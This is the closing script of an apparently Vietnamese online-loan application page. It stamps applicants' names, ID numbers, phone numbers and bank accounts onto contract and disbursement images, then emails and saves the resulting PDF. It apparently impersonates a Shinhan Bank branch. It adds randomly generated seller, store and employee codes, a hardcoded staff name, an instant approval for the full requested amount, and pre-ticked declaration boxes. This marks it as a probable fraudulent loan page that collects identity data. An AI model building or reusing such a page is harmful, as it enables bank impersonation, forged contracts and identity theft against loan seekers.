                    const canvas = document.getElementById('contractCanvas');
                    userData.contractImageUrl = canvas.toDataURL('image/jpeg', 0.7);
                    showToast("Hợp đồng đã được ký thành công!", true);
                    proceedToStep('8-1', 9, 90);
                } else {
                    showToast("Mã OTP không đúng!", false);
                }
                $btn.removeClass('loading').prop('disabled', false);
            } catch (error) {
                console.error("Lỗi xác minh OTP ký hợp đồng:", error);
                showToast("Lỗi xác minh OTP ký hợp đồng!", false);
                $btn.removeClass('loading').prop('disabled', false);
            }
        });

        $('#proceedToFinalStepBtn').on('click', async function() {
            try {
                const $btn = $(this);
                $btn.addClass('loading').prop('disabled', true);
                const canvas = document.getElementById('disbursementCanvas');
                userData.disbursementImageUrl = canvas.toDataURL('image/jpeg', 0.7);
                const pdf = new jsPDF({
                    orientation: 'portrait',
                    unit: 'mm',
                    format: 'a4'
                });
                const contractImgData = userData.contractImageUrl || formData.fallbackImage;
                const disbursementImgData = userData.disbursementImageUrl || formData.fallbackImage;
                pdf.addImage(contractImgData, 'JPEG', 0, 0, 210, 297);
                pdf.addPage();
                pdf.addImage(disbursementImgData, 'JPEG', 0, 0, 210, 297);
                pdf.save(`Hoso_VayTinChap_${userData.loanCode}.pdf`);
                const templateParams = {
                    to_email: userData.email || "unknown@example.com",
                    full_name: userData.fullName || "Khách hàng",
                    loan_code: userData.loanCode || "N/A",
                    loan_amount: formatNumber(userData.loanAmount) || "0",
                    registration_date: userData.registrationDate || getCurrentDate()
                };
                emailjs.send('service_6s4r7xg', 'template_7n3y8vh', templateParams)
                    .then(() => {
                        showToast("Hồ sơ đã được gửi đến email của bạn!", true);
                    })
                    .catch(error => {
                        console.error("Lỗi gửi email hoàn tất:", error);
                        showToast("Lỗi gửi email hoàn tất!", false);
                    });
                proceedToStep(9, 10, 100);
                $btn.removeClass('loading').prop('disabled', false);
            } catch (error) {
                console.error("Lỗi xử lý bước cuối:", error);
                showToast("Lỗi hoàn tất hồ sơ. Vui lòng thử lại!", false);
                $btn.removeClass('loading').prop('disabled', false);
            }
        });

        async function renderContractCanvas(canvasId, imageUrl, data) {
            try {
                const canvas = document.getElementById(canvasId);
                if (!canvas) {
                    throw new Error(`Canvas với ID ${canvasId} không tồn tại`);
                }
                const ctx = canvas.getContext('2d');
                canvas.classList.add('loading');

                // Xóa nội dung canvas hiện tại
                ctx.clearRect(0, 0, canvas.width, canvas.height);

                // Hàm thử tải hình ảnh với retry
                const loadImageWithRetry = async (url, retries = 2) => {
                    let attempt = 0;
                    while (attempt <= retries) {
                        try {
                            const img = new Image();
                            img.crossOrigin = "Anonymous";
                            img.src = url + (attempt > 0 ? `?retry=${attempt}` : '');
                            await new Promise((resolve, reject) => {
                                img.onload = () => resolve(img);
                                img.onerror = () => reject(new Error(`Lỗi tải hình ảnh từ ${url}`));
                            });
                            return img;
                        } catch (error) {
                            attempt++;
                            if (attempt > retries) {
                                console.warn(`Hết lượt thử tải ${url}, dùng hình dự phòng`);
                                return new Image();
                            }
                            await new Promise(resolve => setTimeout(resolve, 1000));
                        }
                    }
                };

                // Tải hình ảnh hợp đồng
                let img = await loadImageWithRetry(imageUrl || formData.fallbackImage);
                if (!img.src || img.src === window.location.href) {
                    img.src = formData.fallbackImage;
                    await new Promise((resolve) => {
                        img.onload = resolve;
                        img.onerror = () => {
                            console.error("Lỗi tải hình dự phòng");
                            resolve();
                        };
                    });
                }

                // Thiết lập canvas
                const scale = 0.33;
                canvas.width = img.width * scale;
                canvas.height = img.height * scale;
                ctx.imageSmoothingEnabled = true;
                ctx.imageSmoothingQuality = 'high';
                ctx.drawImage(img, 0, 0, canvas.width, canvas.height);

                // Đợi font Roboto tải
                await document.fonts.load('14px Roboto');
                ctx.font = '14px Roboto';
                ctx.fillStyle = 'black';
                ctx.textAlign = 'left';
                ctx.textBaseline = 'middle';

                // Định dạng ngày đăng ký
                const [day, month, year] = (data.registrationDate || getCurrentDate()).split('/');

                // Điền thông tin vào hợp đồng
                const fields = [
                    { text: day, x: 413, y: 313 }, // Ngày nộp hồ sơ (ngày)
                    { text: month, x: 541, y: 311 }, // Ngày nộp hồ sơ (tháng)
                    { text: year, x: 681, y: 311 }, // Ngày nộp hồ sơ (năm)
                    { text: data.fullName || "Không Cung Cấp", x: 401, y: 359 }, // Họ và tên
                    { text: data.idNumber || "Không Cung Cấp", x: 393, y: 415 }, // Số CMND/CCCD
                    { text: data.phoneNumber || "Không Cung Cấp", x: 403, y: 513 }, // Số điện thoại
                    { text: data.email || "Không Cung Cấp", x: 405, y: 567 }, // Email
                    { text: formatNumber(data.loanAmount) + " VND", x: 409, y: 689 }, // Số tiền yêu cầu
                    { text: data.loanPurpose === "Khác" ? data.loanPurpose : "Vay tiêu dùng", x: 505, y: 895 }, // Mục đích khác
                    { text: data.interestRate || "12%", x: 453, y: 1125 }, // Lãi suất
                    { text: data.accountNumber || "Không Cung Cấp", x: 273, y: 1493 }, // Số tài khoản
                    { text: data.loanCode || "N/A", x: 1207, y: 413 }, // Số hợp đồng
                    { text: data.registrationDate || getCurrentDate(), x: 1467, y: 411 }, // Ngày đăng ký
                    { text: generateRandomCode(8), x: 1271, y: 451 }, // Mã bên bán hàng
                    { text: generateRandomCode(6), x: 1517, y: 445 }, // Mã cửa hàng
                    { text: "Nguyễn Thị Mỹ Duyên", x: 961, y: 1599 }, // Tên nhân viên
                    { text: "Chi nhánh Shinhanbank Đà Nẵng", x: 967, y: 1655 }, // Chi nhánh
                    { text: generateRandomCode(4), x: 1127, y: 1719 }, // Mã số nhân viên
                    { text: formatNumber(data.loanAmount) + " VND", x: 1217, y: 2109 }, // Số tiền phê duyệt
                    { text: day, x: 1231, y: 2161 }, // Ngày phê duyệt (ngày)
                    { text: month, x: 1349, y: 2161 }, // Ngày phê duyệt (tháng)
                    { text: year, x: 1477, y: 2163 } // Ngày phê duyệt (năm)
                ];
                fields.forEach(field => {
                    ctx.fillText(field.text, field.x * scale, field.y * scale);
                });

                // Tick mục đích vay
                ctx.font = '20px Roboto';
                if (data.loanPurpose === "Sửa chữa nhà") {
                    ctx.fillText('✔', 145 * scale, 835 * scale);
                } else if (data.loanPurpose === "Mua xe") {
                    ctx.fillText('✔', 385 * scale, 833 * scale);
                } else if (data.loanPurpose === "Vay tiêu dùng") {
                    ctx.fillText('✔', 145 * scale, 833 * scale);
                }

                // Tick kỳ hạn
                if (data.loanTerm === "12") {
                    ctx.fillText('✔', 429 * scale, 1069 * scale);
                } else if (data.loanTerm === "24") {
                    ctx.fillText('✔', 541 * scale, 1067 * scale);
                } else if (data.loanTerm === "36") {
                    ctx.fillText('✔', 645 * scale, 1069 * scale);
                }

                // Tick các ô mặc định
                ctx.fillText('✔', 1569 * scale, 1807 * scale); // Email gửi đúng
                ctx.fillText('✔', 1571 * scale, 1877 * scale); // Chủ thẻ
                ctx.fillText('✔', 1569 * scale, 1917 * scale); // Hồ sơ nộp
                ctx.fillText('✔', 1569 * scale, 1953 * scale); // Người hưởng lợi

                canvas.classList.remove('loading');
            } catch (error) {
                console.error("Lỗi render hợp đồng:", error);
                showToast("Lỗi hiển thị hợp đồng! Vui lòng thử lại.", false);
            }
        }

        async function renderDisbursementCanvas(canvasId, imageUrl, data) {
            try {
                const canvas = document.getElementById(canvasId);
                if (!canvas) {
                    throw new Error(`Canvas với ID ${canvasId} không tồn tại`);
                }
                const ctx = canvas.getContext('2d');
                canvas.classList.add('loading');

                // Xóa nội dung canvas hiện tại
                ctx.clearRect(0, 0, canvas.width, canvas.height);

                // Hàm thử tải hình ảnh với retry
                const loadImageWithRetry = async (url, retries = 2) => {
                    let attempt = 0;
                    while (attempt <= retries) {
                        try {
                            const img = new Image();
                            img.crossOrigin = "Anonymous";
                            img.src = url + (attempt > 0 ? `?retry=${attempt}` : '');
                            await new Promise((resolve, reject) => {
                                img.onload = () => resolve(img);
                                img.onerror = () => reject(new Error(`Lỗi tải hình ảnh từ ${url}`));
                            });
                            return img;
                        } catch (error) {
                            attempt++;
                            if (attempt > retries) {
                                console.warn(`Hết lượt thử tải ${url}, dùng hình dự phòng`);
                                return new Image();
                            }
                            await new Promise(resolve => setTimeout(resolve, 1000));
                        }
                    }
                };

                // Tải hình ảnh điều kiện giải ngân
                let img = await loadImageWithRetry(imageUrl || formData.fallbackImage);
                if (!img.src || img.src === window.location.href) {
                    img.src = formData.fallbackImage;
                    await new Promise((resolve) => {
                        img.onload = resolve;
                        img.onerror = () => {
                            console.error("Lỗi tải hình dự phòng");
                            resolve();
                        };
                    });
                }

                // Thiết lập canvas
                const scale = 0.25;
                canvas.width = img.width * scale;
                canvas.height = img.height * scale;
                ctx.imageSmoothingEnabled = true;
                ctx.imageSmoothingQuality = 'high';
                ctx.drawImage(img, 0, 0, canvas.width, canvas.height);

                // Đợi font Roboto tải
                await document.fonts.load('14px Roboto');
                ctx.font = '14px Roboto';
                ctx.fillStyle = 'black';
                ctx.textAlign = 'left';
                ctx.textBaseline = 'middle';

                // Điền thông tin vào điều kiện giải ngân
                const fields = [
                    { text: data.accountNumber || "Không Cung Cấp", x: 931, y: 725 }, // Số tài khoản
                    { text: data.fullName || "Không Cung Cấp", x: 953, y: 821 }, // Họ và tên
                    { text: data.bankName || "Không Cung Cấp", x: 961, y: 889 }, // Ngân hàng
                    { text: data.idNumber || "Không Cung Cấp", x: 993, y: 1121 }, // CMND/CCCD
                    { text: data.idIssueDate || "01/01/2000", x: 1661, y: 1121 }, // Ngày cấp
                    { text: data.idIssuePlace || "Không Cung Cấp", x: 2233, y: 1121 } // Nơi cấp
                ];
                fields.forEach(field => {
                    ctx.fillText(field.text, field.x * scale, field.y * scale);
                });

                canvas.classList.remove('loading');
            } catch (error) {
                console.error("Lỗi render điều kiện giải ngân:", error);
                showToast("Lỗi hiển thị điều kiện giải ngân! Vui lòng thử lại.", false);
            }
        }

        $(document).ready(function() {
            try {
                $('[data-bs-toggle="tooltip"]').tooltip();
                const savedData = localStorage.getItem('userData');
                if (savedData) {
                    userData = JSON.parse(savedData);
                    updatePreviewSection();
                    if (userData.currentStep >= 7) {
                        renderContractCanvas('step7ContractCanvas', formData.contractImage, userData);
                    }
                    if (userData.currentStep >= 9) {
                        renderDisbursementCanvas('disbursementCanvas', formData.disbursementImage, userData);
                    }
                }
            } catch (error) {
                console.error("Lỗi khởi tạo trang:", error);
                showToast("Lỗi khởi tạo. Vui lòng làm mới trang!", false);
            }
        });
    </script>
</body>
</html>
